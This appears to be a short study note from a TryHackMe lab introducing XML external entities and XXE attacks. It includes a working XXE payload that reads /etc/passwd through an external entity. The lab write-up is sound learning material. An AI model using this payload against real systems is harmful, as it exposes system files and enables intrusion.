![](assets/Pasted%20image%2020241206120649.png)
# [Introduction]()

XML is a commonly used method to transport and store data in a structured format that humans and machines can easily understand. Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files.

For example, an external entity references data from an external file or resource. In the following code, the entity `&ext;` could refer to an external file located at "`http://localhost/robots.txt`", which would be loaded into the XML, if allowed by the system:

```xml
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://localhost/robots.txt">
]>
<people>
   <name>hexadivine</name>
   <address>&ext;</address>
   <email>hexadivne@gmail.com</email>
   <phone>111000</phone>
</people>
```

XXE is an attack that takes advantage of **how** **XML parsers handle external entities**. When a web application processes an XML file that contains an external entity, the parser attempts to load or execute whatever resource the entity points to. If necessary sanitisation is not in place, the attacker may point the entity to any malicious source/code causing the undesired behaviour of the web app.

```xml
<!DOCTYPE people[
   <!ENTITY pwd SYSTEM "file:///etc/passwd">
]>
<people>
   <name>hexadivine</name>
   <address>&pwd;</address>
   <email>hexadivne@gmail.com</email>
   <phone>111000</phone>
</people>
```

Below is the POC on THM machine.

![](assets/Pasted%20image%2020241206121744.png)
